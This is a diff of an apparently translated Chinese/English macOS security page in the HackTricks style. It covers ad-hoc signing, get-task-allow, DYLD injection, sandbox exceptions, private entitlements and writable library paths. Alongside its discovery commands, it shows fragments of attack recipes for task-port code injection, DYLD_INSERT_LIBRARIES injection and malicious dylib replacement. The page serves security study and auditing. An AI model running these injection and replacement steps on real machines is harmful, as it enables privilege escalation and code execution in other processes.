@@ -4,20 +4,20 @@
 
 ## Ad-Hoc Signed Binaries
 
-### 基本信息
+### Basic Information
 
-**Ad-hoc signing** (`CS_ADHOC`) 会创建一个没有证书链的代码签名 — 它只是代码的哈希，没有开发者身份验证。该 binary 的来源无法追溯到任何开发者或组织。
+**Ad-hoc signing** (`CS_ADHOC`) 会创建一个**没有证书链**的 code signature —— 它只是代码的 hash，不包含 developer identity verification。无法追溯 binary 的来源属于哪个 developer 或 organization。
 
-在 Apple Silicon Macs 上，所有可执行文件至少需要一个 ad-hoc 签名。这意味着你会在许多开发工具、Homebrew 包和第三方实用程序中发现 ad-hoc 签名。
+在 Apple Silicon Mac 上，所有 executable 至少都需要 ad-hoc signature。这意味着你会在许多 development tools、Homebrew packages 和 third-party utilities 上发现 ad-hoc signatures。
 
-### 为什么这很重要
+### Why This Matters
 
-- **No verifiable identity** — binary 可以被替换而不会被基于身份的检查检测到
-- 第三方 ad-hoc binaries 位于 **privileged positions**（FDA, daemon, helpers）时是高优先级目标
-- 在某些配置下，ad-hoc signatures 可能不会像 developer-signed code 那样被严格验证
-- 拥有 **TCC grants** 的 ad-hoc signed binaries 尤其有价值 — 即使 binary 内容发生变化，权限授予也会持续（取决于 TCC 如何给授予加键）
+- **No verifiable identity** —— binary 可以在不被基于 identity 的检查发现的情况下被替换
+- 处于**privileged positions**（FDA、daemon、helpers）中的 third-party ad-hoc binaries 是高优先级 targets
+- 在某些 configurations 中，ad-hoc signatures 的 verification 可能**不如** developer-signed code 严格
+- 具有 **TCC grants** 的 ad-hoc signed binaries 尤其有价值 —— 即使 binary content 发生变化，grants 仍会持久存在（取决于 TCC 对 grant 的 keyed 方式）
 
-### 发现
+### Discovery
 ```bash
 # Find ad-hoc signed binaries
 find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
@@ -29,7 +29,7 @@ echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
 codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
 # Ad-hoc shows: "Signature=adhoc" and no Authority lines
 ```
-### 攻击: Binary Replacement
+### 攻击：Binary Replacement
 ```bash
 # If an ad-hoc signed daemon binary is in a writable location:
 # 1. Check the binary's current capabilities
@@ -50,16 +50,16 @@ codesign -s - /path/to/target
 ```
 ---
 
-## 可调试进程 (get-task-allow)
+## 可调试进程（get-task-allow）
 
 ### 基本信息
 
-具有 **`com.apple.security.get-task-allow`** entitlement（或 `CS_GET_TASK_ALLOW` 标志）的进程允许 **任何进程作为 debugger 附加**，读取内存、修改寄存器、注入代码并控制执行。
+**`com.apple.security.get-task-allow`** entitlement（或 `CS_GET_TASK_ALLOW` flag）允许**任何进程附加为 debugger**，读取内存、修改寄存器、注入 code，以及控制执行流程。
 
-这仅用于开发构建。但一些第三方二进制在生产环境中仍带有该 entitlement。
+这项功能**仅用于 development builds**。然而，部分 third-party binaries 在 production 中仍携带此 entitlement。
 
 > [!CAUTION]
-> 一个在生产环境带有 `get-task-allow` 的二进制是一个 **即时利用原语**。任何本地进程都可以调用 `task_for_pid()`，获取目标的 Mach task port，并注入任意代码，该代码以目标的 entitlements、TCC grants 和 security context 运行。
+> 带有 `get-task-allow` 的 production binary 是一个**可立即利用的 exploitation primitive**。任何本地进程都可以调用 `task_for_pid()`，获取目标的 Mach task port，并注入任意 code，使其以目标的 entitlements、TCC grants 和 security context 运行。
 
 ### 发现
 ```bash
@@ -76,7 +76,7 @@ JOIN capabilities c ON ec.capability_id = c.id
 WHERE c.name = 'get_task_allow_signature'
 ORDER BY e.privileged DESC;"
 ```
-### 攻击： Task Port Injection
+### Attack: Task Port Injection
 ```c
 #include <mach/mach.h>
 #include <mach/mach_vm.h>
@@ -103,17 +103,17 @@ VM_PROT_READ | VM_PROT_EXECUTE);
 ```
 ---
 
-## 无库验证 + DYLD 环境
+## No Library Validation + DYLD Environment
 
-### 致命组合
+### The Deadly Combination
 
-当一个二进制同时具有**两者**时：
-- `com.apple.security.cs.disable-library-validation` (loads any dylib)
-- `com.apple.security.cs.allow-dyld-environment-variables` (accepts DYLD env vars)
+当一个 binary 同时具有以下两项时：
+- `com.apple.security.cs.disable-library-validation`（加载任意 dylib）
+- `com.apple.security.cs.allow-dyld-environment-variables`（接受 DYLD 环境变量）
 
-这就是一个**保证可用的代码注入原语** — `DYLD_INSERT_LIBRARIES` works perfectly。
+这就是一个**保证可用的 code injection primitive**——`DYLD_INSERT_LIBRARIES` 可以完美运行。
 
-### 发现
+### Discovery
 ```bash
 # Find binaries with the deadly combo
 find /Applications -type f -perm +111 -exec sh -c '
@@ -129,7 +129,7 @@ SELECT path, privileged, tccPermsStr FROM executables
 WHERE noLibVal = 1 AND allowDyldEnv = 1
 ORDER BY privileged DESC;"
 ```
-### 攻击: DYLD_INSERT_LIBRARIES Injection
+### 攻击：DYLD_INSERT_LIBRARIES Injection
 ```bash
 # 1. Create the injection dylib
 cat > /tmp/inject.c << 'EOF'
@@ -170,19 +170,19 @@ cat /tmp/injected_proof.txt
 
 ### 它们如何削弱 Sandbox
 
-Sandbox temporary exceptions (`com.apple.security.temporary-exception.*`) 会在 App Sandbox 中打洞：
+Sandbox 临时例外（`com.apple.security.temporary-exception.*`）会在 App Sandbox 中打开缺口：
 
-| Exception | 它允许的内容 |
+| Exception | 允许的操作 |
 |---|---|
-| `temporary-exception.mach-lookup.global-name` | 连接到系统范围的 XPC/Mach 服务 |
-| `temporary-exception.files.absolute-path.read-write` | 读取/写入 应用容器之外的文件 |
-| `temporary-exception.iokit-user-client-class` | 打开 IOKit 用户客户端连接 |
-| `temporary-exception.shared-preference.read-only` | 读取其他应用的偏好设置 |
+| `temporary-exception.mach-lookup.global-name` | 连接系统范围的 XPC/Mach 服务 |
+| `temporary-exception.files.absolute-path.read-write` | 读取/写入 app container 外部的文件 |
+| `temporary-exception.iokit-user-client-class` | 打开 IOKit user-client 连接 |
+| `temporary-exception.shared-preference.read-only` | 读取其他 app 的偏好设置 |
 | `temporary-exception.files.home-relative-path.read-write` | 访问相对于 `~` 的路径 |
 
-### Mach-Lookup 异常 = Sandbox Escape Primitive
+### Mach-Lookup 例外 = Sandbox Escape 原语
 
-最危险的例外是 **mach-lookup** — 它允许 sandboxed app 与特权守护进程通信：
+最危险的例外是 **mach-lookup** ——它允许 sandboxed app 与特权 daemon 通信：
 ```bash
 # Find apps with mach-lookup exceptions
 find /Applications -name "*.app" -exec sh -c '
@@ -196,7 +196,7 @@ echo "[$count exceptions] $(basename "$1")"
 }
 ' _ {} \; 2>/dev/null | sort -rn
 ```
-### 攻击：通过 Mach-Lookup 进行沙箱逃逸
+### 攻击：通过 Mach-Lookup 逃逸 Sandbox
 ```
 1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
 2. Read entitlements to discover mach-lookup exceptions
@@ -209,21 +209,21 @@ c. Fuzz each exposed method
 ```
 ---
 
-## 私有 Apple Entitlements
+## Private Apple Entitlements
 
 ### 它们是什么
 
-以 `com.apple.private.*` 为前缀的 Entitlements 提供对未对第三方开发者记录或开放的 **Apple 内部 APIs** 的访问。拥有私有 entitlements 的第三方二进制通常通过 enterprise cert、MDM 或非 App-Store 分发方式获得。
+以 `com.apple.private.*` 为前缀的 Entitlements 可访问**Apple 内部 API**，这些 API 未公开文档，也不向第三方开发者提供。第三方二进制文件可通过企业证书、MDM 或非 App Store 分发方式获得 Private Entitlements。
 
-### 危险的私有 Entitlements
+### 危险的 Private Entitlements
 
 | Entitlement | Capability |
 |---|---|
-| `com.apple.private.tcc.manager` | 对整个 TCC 数据库的读/写 |
-| `com.apple.private.tcc.allow` | 访问特定的 TCC 服务 |
-| `com.apple.private.security.no-sandbox` | 在无 sandbox 下运行 |
-| `com.apple.private.iokit` | 直接访问 IOKit 驱动 |
-| `com.apple.private.kernel.\*` | 访问 kernel 接口 |
+| `com.apple.private.tcc.manager` | 完整读取/写入 TCC 数据库 |
+| `com.apple.private.tcc.allow` | 访问特定 TCC 服务 |
+| `com.apple.private.security.no-sandbox` | 在无 sandbox 的情况下运行 |
+| `com.apple.private.iokit` | 直接访问 IOKit 驱动程序 |
+| `com.apple.private.kernel.\*` | 访问内核接口 |
 | `com.apple.private.xpc.launchd.job-label` | 注册/管理 launchd 任务 |
 | `com.apple.rootless.install` | 写入受 SIP 保护的路径 |
 
@@ -246,13 +246,13 @@ ORDER BY privileged DESC;"
 ```
 ---
 
-## Custom Sandbox Profiles (SBPL)
+## 自定义 Sandbox Profiles（SBPL）
 
 ### 它们是什么
 
-二进制文件可以随附以 SBPL (Seatbelt Profile Language) 编写的 **自定义 sandbox 配置文件**。这些配置文件可以比默认的 App Sandbox 更严格，或者 **更宽松**。
+二进制文件可以随附使用 SBPL（Seatbelt Profile Language）编写的自定义 Sandbox Profiles。这些 Profiles 可能比默认的 App Sandbox 限制更严格，或者**更宽松**。
 
-### 审计自定义配置文件
+### 审计自定义 Profiles
 ```bash
 # Find custom sandbox profiles
 find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null
@@ -270,13 +270,13 @@ cat /path/to/custom.sb | grep "(allow" | sort -u
 ```
 ---
 
-## 可写的库路径
+## 可写 Library 路径
 
 ### 它们是什么
 
-当一个 binary 从当前用户可以 **write to** 的 path 加载 dynamic library 时，该 library 可以被替换为恶意代码。
+当某个 binary 从当前用户可以**写入**的路径加载 dynamic library 时，该 library 可能会被替换为恶意代码。
 
-### 发现
+### 发现方法
 ```bash
 # Using the scanner — find privileged binaries loading from writable paths
 sqlite3 /tmp/executables.db "
@@ -293,7 +293,7 @@ otool -L /path/to/binary | awk '{print $1}' | while read lib; do
 [ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
 done
 ```
-### 攻击：Dylib Replacement
+### Attack: Dylib Replacement
 ```bash
 # 1. Find the writable library
 otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"
@@ -317,11 +317,12 @@ cp /tmp/evil.dylib /path/to/writable.dylib
 
 # 5. When the daemon restarts, it loads the evil dylib with daemon privileges
 ```
-## 参考资料
+## References
 
-* [Apple Developer — Code Signing Guide](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
-* [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
-* [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
-* [The Evil Bit — clear-library-validation](https://theevilbit.github.io/posts/com.apple.private.security.clear-library.validation/)
+- [1] [Apple Developer — Code Signing 指南](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
+- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
+- [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
+- [4] [XNU — `bsd/sys/codesign.h`（`CS_OPS_*` 操作和 `CLEAR_LV_ENTITLEMENT`）](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
+- [5] [XNU — `bsd/kern/kern_proc.c`（`csops` / `CS_OPS_CLEAR_LV` 处理程序）](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
 
 {{#include ../../../banners/hacktricks-training.md}}
